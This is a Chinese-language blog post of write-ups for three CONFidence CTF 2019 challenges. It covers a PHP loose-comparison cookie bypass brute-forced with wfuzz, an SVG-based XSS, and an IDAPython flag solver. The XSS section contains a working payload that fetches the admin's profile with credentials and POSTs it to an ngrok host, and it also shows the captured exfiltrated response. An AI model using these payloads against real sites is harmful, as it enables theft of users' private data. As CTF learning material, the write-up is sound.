---
layout: draft
title: CONFidence CTF 2019 writeups - My admin panel, Elementary, Web 50
categories: CTF
description: CTF writeup
keywords: CTF, web, reversing
---

最近因為工作需求要做PT，開始接觸到比較多web exploit，而我在這方面實在是很弱很弱，於是找了CTF來練練web題，這次總共做了兩題web和一題reversing。

---

## My admin panel - [web 51p]

題目給了source code
```php
<?php

include '../func.php';
include '../config.php';

if (!$_COOKIE['otadmin']) {
    exit("Not authenticated.\n");
}

if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
    exit();
}

$session_data = json_decode($_COOKIE['otadmin'], true);

if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }

if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
    echo("I CAN EVEN GIVE YOU A HINT XD \n");

    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
    }

    exit("\n");
}

display_admin();
```
   
一個簡單的php code，檢查cookie `otadmin`是否符合`{"hash": ...}`的格式，如果符合，再跟某個secret值檢查相等，其實想了一下就知道不可能破出來，一定是找其他問題點，瀏覽一下可看到關鍵的一行：
```
if ($session_data['hash'] != strtoupper(MD5($cfg_pass)))
```
用的是`==`而不是`===`，牽扯到string比對用`==`那肯定得出問題的，例如
```php
0 == "aa" 
0 != "1"  
0 != "1a"  
0 == "a1"
1 == "1a"
```
以上得到的全都是**true**！總而言之string頭有數字就會被當數字。  

另外如果false時會噴hint
> I CAN EVEN GIVE YOU A HINT XD
> 0006464640640064000646464640006400640640646400
回去看一下code，會發現這個output來自於`secret[i] & 0xc0`，加上這個secret是某個MD5 hash，所以只能是英文和數字，output是**0**的是`0-9`，而output是**64**的是`a-zA-Z`，所以能得出一個結論－**secret的前三byte是數字**。

再結合`==`的特性，只要**brute-force三位數數字**就能解了。
  
```sh
wfuzz -b otadmin="{\"hash\": FUZZ}" --hh=78 -c -z range,0-999 https://gameserver.zajebistyc.tf/admin/login.php
```

flag - `p4{wtf_php_comparisons_how_do_they_work}`

## Web 50 - [web 154p]
網站有`profile`和`report`兩個page，其中`/report`可以傳一個URL給他，不過只能是同個domain底下的，page也講得很明白了：
> admin will take a look, blah blah, you know what it means

看來就是要偷admin的cookie之類的，不過看了一下是`httpOnly`，好像又不太行？

再看一下`/profile`，可以填一些值和上傳圖片，上傳圖片會檢查header，不過我以為做一份header出來然後把
payload塞在後面就可以，結果傳完之後的URL還是被當作圖片來解析(即使副檔名是php之類)，改`Content-Type`也沒用，到現在還是不知道為何...
   
最後想到了**SVG XSS**，傳了普通的SVG上去後發現OK，接著就開始來踹踹看XSS：
(有圖片大小檢查要稍微注意)
```javascript
<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg"  width="100px" height="100px" xml:space="preserve">                              
    <script>
    	alert(1);
    </script>
</svg>
```
成功觸發XSS!那麼接下來就要想想能怎麼利用這個XSS，在嘗試的過程發現可以拜訪其他人的profile(包括admin)，
但`secret`是看不到的，於是就猜想這個`secret`應該就是flag，往這個方向繼續構造payload
```javascript
<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg"  width="100px" height="100px" xml:space="preserve">                              
    <script>
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                var xhr2 = new XMLHttpRequest();
                xhr2.open("POST", "http://59d95a27.ngrok.io");
                xhr2.send(xhr.responseText);
            }
        }
        xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
        xhr.withCredentials = true;
        xhr.send();
    </script>
</svg>
```

這邊使用了`ngrok`來expose local server，不得不嘲笑一下自己的網路知識...那時候一直在google `nc http echo web server`，結果問題是根本沒有public ip，鬼打牆了好久。
  
總結一下利用步驟：
1. 使用`ngrok`取得對外server
2. 觸發admin端去GET自己的profile
3. 把content丟給server
4. server forward給localhost(nc之類的)

```html
POST / HTTP/1.1
Host: 59d95a27.ngrok.io
Content-Length: 1808
Origin: http://web50.zajebistyc.tf
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/72.0.3626.122 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Referer: http://web50.zajebistyc.tf/avatar/688787d8ff144c502c7f5cffaafe2cc588d86079f9de88304c26b0cb99ce91c6/payload.svg
Accept-Encoding: gzip, deflate
X-Forwarded-For: 37.187.92.182

Hi admin
<img src="//avatar/default/duck.png" style="max-width: 100px; max-height: 100px">
<form method="POST" enctype="multipart/form-data">
    <div>
        Firstname:
    <input type="text" name="firstname" value="Janusz">
    </div>
    <div>
        Lastname:
    <input type="text" name="lastname" value="Nosacz">
    </div>
    <div>
        Shoesize:
    <select name="shoesize" value=40>
        <option value="30">30</option>
        <option value="31">31</option>
        <option value="32">32</option>
        <option value="33">33</option>
        <option value="34">34</option>
        <option value="35">35</option>
        <option value="36">36</option>
        <option value="37">37</option>
        <option value="38">38</option>
        <option value="39">39</option>
        <option value="40">40</option>
        <option value="41">41</option>
        <option value="42">42</option>
        <option value="43">43</option>
        <option value="44">44</option>
        <option value="45">45</option>
        <option value="46">46</option>
        <option value="47">47</option>
        <option value="48">48</option>
        <option value="49">49</option>
        <option value="50">50</option>
        <option value="51">51</option>
        <option value="52">52</option>
        <option value="53">53</option>
        <option value="54">54</option>
        <option value="55">55</option>
        <option value="56">56</option>
        <option value="57">57</option>
        <option value="58">58</option>
        <option value="59">59</option>
    </select>
    </div>
    <div>
        Secret:
    <input type="text" name="secret" value="p4{15_1t_1m4g3_or_n0t?}">
    </div>
    <div>
        Avatar:
    <input type="file" name="avatar">
    </div>
    <input type="submit">
</form>
```

成功得到admin's secret!

flag : `p4{15_1t_1m4g3_or_n0t?}`

### Ref. writeups
* [use Burp Collaborator](https://github.com/HalfFlag/ctf-writeups/tree/master/web/teaser-confidence-2019_web-50)
* [cache poison](https://ctftime.org/writeup/13925)

## Elementary - [reversing 57p]
相對Web來說Reversing還是比較擅長的，原來想利用這題來練習Ghidra，沒想到Ghidra decompile出來的東西超醜...(一堆nested if)，相比IDA全都是one layer if statement，於是索性寫個IDApy來解了。

```python
import re
funcs = []
for x in idautils.Functions():
        fn = get_func_name(x)
        if fn.find('function') != -1:
                de = int(str(idaapi.decompile(x)).find('^')!=-1)
                funcs.append([fn, x, de])
                
checkFlag_addr = 0xCEB7C
de = str(idaapi.decompile(checkFlag_addr)).split('function')[1:]

flag = [0]*1000

for code in de:
        idx = re.search('a1 \+ ([0-9]+)', code)
        idx = 0 if not idx else int(idx.group(1))
        bit = re.search('>> ([0-9]+)', code)
        bit = 0 if not bit else int(bit.group(1))

        flag[idx] += funcs[ int(code.split('(')[0]) ][2] << bit

flag=list(filter(lambda a: a != 0, flag))
print('flag => ' + ''.join(list(map(chr, flag))))

```

flag : `p4{I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually}`

## Ref.
* [How to expose a local development server to the Internet](https://medium.com/botfuel/how-to-expose-a-local-development-server-to-the-internet-c31532d741cc)
* [測試 webhook 不再煩惱：ngrok](https://blog.techbridge.cc/2018/05/24/ngrok/)
* 